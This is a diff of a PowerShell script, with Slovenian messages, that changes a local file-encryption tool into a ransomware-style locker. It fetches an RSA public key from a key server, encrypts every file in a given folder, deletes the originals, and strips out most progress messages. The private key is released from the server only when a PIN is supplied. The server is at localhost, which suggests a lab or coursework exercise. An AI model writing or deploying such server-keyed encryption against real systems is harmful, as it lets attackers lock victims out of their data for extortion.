@@ -1,31 +1,31 @@
 param (
-    [string]$Mode,  # "encrypt" or "decrypt"
-    [string]$KeyPath
+    [string]$Mode,
+    [string]$KeyPath,
+    [string]$FilesPath,
+    [string]$Pin
 )
 
-function Generate-Key {
-    $keyPath = "$PSScriptRoot\private_key.xml"
-    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider 2048
-    $rsa.PersistKeyInCsp = $false
-    $rsa.ToXmlString($true) | Out-File -Encoding UTF8 $keyPath
-    Write-Host "Private key saved to: $keyPath"
-    return $rsa
+function Save-SerialKey($filesPath, $hash) {
+    $serialkeyContent = @{
+        FilesPath = $filesPath
+        CommunicationHash = $hash
+    } | ConvertTo-Json
+    Set-Content -Path "$PSScriptRoot\serialkey" -Value $serialkeyContent
 }
 
-function Load-Key($path) {
+function Load-SerialKey($path) {
     if (!(Test-Path $path)) {
-        Write-Host "Private key not found: $path"
         exit 1
     }
-    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider 2048
-    $rsa.PersistKeyInCsp = $false
-    $rsa.FromXmlString((Get-Content $path -Raw))
-    return $rsa
+    $content = Get-Content $path -Raw | ConvertFrom-Json
+    return $content
 }
 
-function Encrypt-Files {
-    $rsa = Generate-Key
-    $sourceDir = "$PSScriptRoot\files"
+function Encrypt-Files($filesPath, $publicKeyXml) {
+    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider 2048
+    $rsa.PersistKeyInCsp = $false
+    $rsa.FromXmlString($publicKeyXml)
+    $sourceDir = $filesPath
 
     Get-ChildItem $sourceDir -File | ForEach-Object {
         $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
@@ -37,14 +37,15 @@ function Encrypt-Files {
             $encrypted.AddRange($enc)
         }
         [System.IO.File]::WriteAllBytes("$sourceDir\$($_.Name).e", $encrypted.ToArray())
-        Write-Host "Encrypted: $($_.Name)"
         Remove-Item $_.FullName
     }
 }
 
-function Decrypt-Files($keyPath) {
-    $rsa = Load-Key $keyPath
-    $sourceDir = "$PSScriptRoot\files"
+function Decrypt-Files($privateKeyXml, $filesPath) {
+    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider 2048
+    $rsa.PersistKeyInCsp = $false
+    $rsa.FromXmlString($privateKeyXml)
+    $sourceDir = $filesPath
 
     Get-ChildItem $sourceDir -Filter *.e | ForEach-Object {
         $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
@@ -56,34 +57,80 @@ function Decrypt-Files($keyPath) {
                 $plain = $rsa.Decrypt($block, $false)
                 $decrypted.AddRange($plain)
             } catch {
-                Write-Host "Failed to decrypt chunk in: $($_.Name)"
                 continue
             }
         }
         $output = "$sourceDir\$($_.BaseName)"
         [System.IO.File]::WriteAllBytes($output, $decrypted.ToArray())
-        Write-Host "Decrypted: $($_.Name)"
         Remove-Item $_.FullName
     }
-    Remove-Item $keyPath
 }
 
-# ========================= MAIN =========================
-if (!$Mode) {
-    $Mode = Read-Host "Enter mode (encrypt/decrypt)"
+function Register-Key {
+    try {
+        $response = Invoke-RestMethod -Uri "http://localhost:4040/register" -Method Get -TimeoutSec 10
+    } catch {
+        Write-Host "Napaka. Strežnik ni dostopen: http://localhost:4040/register"
+        exit 10
+    }
+    $publicKeyXml = $response.keyXml
+    $hash = $response.communicationKey
+    $generatedAt = $response.generatedAt
+    return @{ publicKeyXml = $publicKeyXml; hash = $hash; generatedAt = $generatedAt }
+}
+
+function Get-PrivateKey($hash, $pin) {
+    try {
+        $response = Invoke-RestMethod -Uri "http://localhost:4040/private?identifier=$hash&key=$pin" -Method Get -TimeoutSec 10
+    } catch {
+        Write-Host "Napaka. Strežnik ni dostopen: http://localhost:4040/private"
+        exit 11
+    }
+    if ($response -match "<RSAKeyValue>") {
+        return $response
+    }
+    return $response
 }
 
 switch ($Mode.ToLower()) {
     "encrypt" {
-        Encrypt-Files
+        if (!$FilesPath) { exit 2 }
+        $reg = Register-Key
+        Write-Host $reg
+        $publicKeyXml = $reg.publicKeyXml
+        Encrypt-Files $FilesPath $publicKeyXml
+        Save-SerialKey $FilesPath $reg.hash
+        exit 0
     }
     "decrypt" {
-        if (!$KeyPath) {
-            $KeyPath = Read-Host "Enter path to private key (.xml)"
+        $serial = Load-SerialKey "$PSScriptRoot\serialkey"
+        $hash = $serial.CommunicationHash
+        if (-not $Pin) {
+            Write-Host "Pin ni bil vnešen!"
+            exit 2
         }
-        Decrypt-Files $KeyPath
+        try {
+            $privateKeyXml = Get-PrivateKey $hash $Pin
+            if ($privateKeyXml -is [System.Xml.XmlDocument]) {
+                $privateKeyXmlString = $privateKeyXml.OuterXml
+            } else {
+                $privateKeyXmlString = [string]$privateKeyXml
+            }
+            if ($privateKeyXmlString -notmatch "<RSAKeyValue>") {
+                Write-Host "Odziv strežnika: $privateKeyXmlString"
+                Write-Host "Napačna koda za dostop ali pa ni bilo mogoče pridobiti ključa iz strežnika."
+                exit 3
+            }
+            $filesPath = $serial.FilesPath
+            Decrypt-Files $privateKeyXmlString $filesPath
+            Remove-Item "$PSScriptRoot\serialkey"
+            exit 0
+        } catch {
+            Write-Host "Napaka med odklepanjem."
+            exit 4
+        }
     }
     default {
-        Write-Host "❗ Invalid mode. Use 'encrypt' or 'decrypt' "
+        exit 1
     }
 }
